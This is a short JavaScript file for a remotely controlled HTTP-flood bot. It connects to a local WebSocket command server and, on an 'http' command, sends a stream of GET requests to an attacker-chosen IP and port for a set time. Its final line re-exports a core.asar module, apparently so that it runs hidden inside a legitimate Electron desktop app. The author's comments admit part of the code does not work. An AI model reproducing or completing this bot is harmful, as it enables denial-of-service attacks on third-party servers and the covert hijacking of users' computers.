const WebSocket = require('ws');
const http = require('http');

const ws = new WebSocket("ws:/127.0.0.1:1337");

function http_flood(ip, port, time) {
    console.log(`ip: ${ip}, port: ${port}, time: ${time}`);

    // ok infinite loop idk / not working i am not a pro js-dev use that (replace):
    /*
    setInterval(() => {
        try {
            http.get(`http://${ip}:${port}`);
        } catch (err) { }
    }, 0);
    */
    
    let start = Number(Date.now());
    let end = start + time * 1000;
    while (Number(Date.now()) < end) {
        try {
            http.get(`http://${ip}:${port}`);
        } catch (err) { }
    }

    console.log('finished');
};

ws.onmessage = async (message) => {
    const payload = JSON.parse(message.data);
    console.log(payload);

    switch (payload.command) {
        case "http":
            http_flood(payload.args[0], payload.args[1], payload.args[2])
            break;

        default:
            break;
    }

    const reply = {
        message: "recieved",
        payload: payload
    };
    ws.send(JSON.stringify(reply));
};

module.exports = require('./core.asar');